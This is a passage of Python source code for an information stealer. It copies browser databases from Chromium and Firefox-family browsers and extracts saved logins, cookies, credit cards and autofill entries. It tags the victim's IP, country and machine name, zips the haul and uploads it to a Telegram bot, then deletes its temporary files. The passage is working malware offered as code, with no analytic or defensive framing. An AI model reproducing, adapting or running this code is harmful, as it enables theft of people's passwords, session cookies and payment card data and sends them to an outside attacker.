    shutil.copy(f"{path}\\{profile}\\Web Data", TMP+"\\autofill_db")
    conn = sqlite3.connect(TMP+"\\autofill_db")
    cursor = conn.cursor()

    cursor.execute("SELECT name, value FROM autofill")

    for row in cursor.fetchall():
        if not row[0] or not row[1]:
            continue
        result += f"Name: {row[0]}\nValue: {row[1]}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        count += 1

    if count > 0:
        dir_path = os.path.join(Data_Path, "AutoFills")
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        autofills_file = os.path.join(dir_path, f"{browser}_{profile}.txt")
        with open(autofills_file, "w", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(TMP + "\\autofill_db")
    return count

gck_browser_profiles = {
    "Firefox": get_gck_profiles(get_gck_basepath("Firefox")),
    "Pale Moon": get_gck_profiles(get_gck_basepath("Pale Moon")),
    "SeaMonkey": get_gck_profiles(get_gck_basepath("SeaMonkey")),
    "Waterfox": get_gck_profiles(get_gck_basepath("Waterfox")),
    "Mercury": get_gck_profiles(get_gck_basepath("Mercury"))
}

total_ch_logins_count = 0
total_ch_cookies_count = 0
total_ch_ccards_count = 0
total_ch_autofill_count = 0

total_gck_logins_count = 0
total_gck_cookies_count = 0

total_browsers_logins_count = 0
total_browsers_cookies_count = 0
total_browsers_ccards_count = 0

available_path = installed_ch_dc_browsers()

for browser in available_path:
    browser_path = ch_dc_browsers[browser]
    ch_master_key = get_ch_master_key(browser_path)

    if not glob.glob(os.path.join(browser_path, "Profile*")):
        profile_folders = [os.path.join(browser_path, "Default")]
    else:
        profile_folders = [os.path.join(browser_path, "Default")] + glob.glob(os.path.join(browser_path, "Profile*"))

    for profile_folder in profile_folders:
        profile = "" if browser in ["Opera", "Opera GX"] else os.path.basename(profile_folder)

        countP = get_ch_login_data(browser, browser_path, profile, ch_master_key)
        total_ch_logins_count += countP

        countC = get_ch_cookies(browser, browser_path, profile, ch_master_key)
        total_ch_cookies_count += countC

        countCC = get_ch_ccards(browser, browser_path, profile, ch_master_key)
        total_ch_ccards_count += countCC

        countAF = get_ch_autofill(browser, browser_path, profile)
        total_ch_autofill_count += countAF

for browser, profiles in gck_browser_profiles.items():
    for profile in profiles:
        profile_name = os.path.basename(profile)

        logins_count = save_gck_login_data([profile], profile_name, browser)
        total_gck_logins_count += logins_count

        cookies_count = save_gck_cookies([profile], profile_name, browser)
        total_gck_cookies_count += cookies_count

total_browsers_logins_count = total_ch_logins_count + total_gck_logins_count
total_browsers_cookies_count = total_ch_cookies_count + total_gck_cookies_count
total_browsers_ccards_count = total_ch_ccards_count

files_to_archive = []

def GetIP():
    try:
        response = requests.get("http://ip-api.com/json/?fields=8195")
        IData = json.loads(response.text)
        SEIP = IData["query"]
        CountryCode = IData["countryCode"]
        CountryName = IData["country"]
        GetIPD = f"IP: {SEIP}\nCountry: {CountryCode} - {CountryName}"
    except:
        GetIPD = "IP: N/A"
        CountryCode = "Unknown"
        SEIP = "Unknown"
    return GetIPD, CountryCode, SEIP

def Counter():
    path = f"{os.environ['USERPROFILE']}\\count"

    if os.path.exists(path):
        with open(path, 'r') as file:
            count = file.read()
        count = int(count) + 1
        with open(path, 'w') as file:
            file.write(str(count))
    else:
        with open(path, 'w') as file:
            file.write("1")
            count = 1
    return count

GetIPD, CountryCode, SEIP = GetIP()
Count = Counter()

zip_data = io.BytesIO()

archive_path = os.path.join(TMP, f"[{CountryCode}_{SEIP}] {os.getenv('COMPUTERNAME', 'defaultValue')}.zip")

with zipfile.ZipFile(zip_data, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zip_file:
    zip_file.comment = f"Time Created: {creation_datetime}\nContact: https://t.me/conkudaden".encode()

    for root, _, files in os.walk(Data_Path):
        for name in files:
            try:
                file_path = os.path.join(root, name)
                zip_file.write(file_path, os.path.relpath(file_path, Data_Path))
            except:
                continue

with open(archive_path, "wb") as f:
    f.write(zip_data.getbuffer())

with open(archive_path, "wb") as f:
    f.write(zip_data.getbuffer())

message_body = f"{GetIPD}\nUser: {os.getlogin()}\nBrowser Data: CK: {total_browsers_cookies_count}|PW: {total_browsers_logins_count}|AF: {total_ch_autofill_count}|CC: {total_browsers_ccards_count}\n"

for i in range(10):
    CHAT_ID = CHAT_ID_NEW #Sv Data Mới


    try:
        with open(archive_path, "rb") as f:
            response = requests.post(
                f"https://api.telegram.org/bot{TOKEN_BOT}/sendDocument",
                params={"chat_id": CHAT_ID, "caption": message_body, "protect_content": True, "disable_web_page_preview": True},
                files={"document": f}
            )
            response.raise_for_status()
            break
    except:
        continue

shutil.rmtree(Data_Path, ignore_errors=True)

if os.path.exists(archive_path):
    os.remove(archive_path)

